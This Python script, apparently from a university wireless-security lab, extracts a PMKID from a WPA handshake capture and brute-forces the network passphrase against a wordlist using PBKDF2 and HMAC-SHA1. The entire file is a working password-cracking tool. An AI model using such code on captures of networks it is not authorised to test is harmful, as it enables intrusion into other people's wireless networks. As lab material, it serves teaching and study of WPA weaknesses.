#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Essaie de bruteforce un WPA sur un PMKID avec des passphrase dans un fichier.
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
import hmac, hashlib

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file. Passphrase is not used.
passPhrase  = "admin123"

APmac = b''
Clientmac = b''
pmkid = b''
ssid = ""

# We checked the association trame in capture, and noticed that the SSID was available, in the "Supported tag". 
# So we could check that we want to attack the targetted SSID. We can get Client et AP MAC there too.
for trame in wpa:
    if trame.subtype == 0x0 and trame.type == 0x0:
        APmac = a2b_hex(trame.addr1.replace(':', ''))
        Clientmac = a2b_hex(trame.addr2.replace(':', ''))
        print("AP MAC :", APmac.hex(), " Client MAC :", Clientmac.hex())
        ssid= trame.info.decode("ascii");
        break
 
pmkid_to_test = b''   
for trame in range(len(wpa)):
    # We get the first signed nonce from the STA to the AP. We only keep those with a pre-selected ClientMAC.
    if raw(wpa[trame])[54] == 0x88 \
        and a2b_hex(wpa[trame].addr2.replace(':', '')) == APmac \
        and a2b_hex(wpa[trame].addr1.replace(':', '')) == Clientmac:
        pmkid_to_test = raw(wpa[trame])[193:209]
        break

# This loops is NOT necessary. It allows to verify which algo to hash is used. If this payload is not present, then by default we use SHA1.
crypto = 0x2
for trame in range(len(wpa)):
    if raw(wpa[trame])[54] == 0x88 \
        and a2b_hex(wpa[trame].addr1.replace(':', '')) == APmac \
        and a2b_hex(wpa[trame].addr2.replace(':', '')) == Clientmac:
        crypto = raw(wpa[trame])[94] & 0x2
        break;
        
# Print basic info.
print("SSID : " , ssid)
print("pmkid : ", pmkid_to_test.hex())
print("crypto :", crypto)

ssid = str.encode(ssid)

#We kept the same passphrase file.
file1 = open('passphrases.txt', 'r')
Lines = file1.readlines()
# we iterate each line for each passphrase
foundPassphrase = False
for line in Lines:
    passPhrase = str.encode(line.strip())

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    if crypto == 2 : # SHA1 to create the MAC (found in 4th message of 4-way handshake)
        pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
    elif crypto == 1: # or it's MD5.
        pmk = pbkdf2(hashlib.md5,passPhrase, ssid, 4096, 32)
    else :
        print("unknown error")

    # We designe the PMKID hash function.
    pmkid = hmac.new(pmk, b'PMK Name' + APmac + Clientmac, hashlib.sha1)

    # We generate the pmkid and verify if it's the same as the one in capture.
    if pmkid_to_test == pmkid.digest()[:16] :
        foundPassphrase = True
        print ("Passphrase found !")
        print ("Passphrase: ",passPhrase,"\n")

if foundPassphrase == False :
    print("The passphrase is not in passphrases.txt")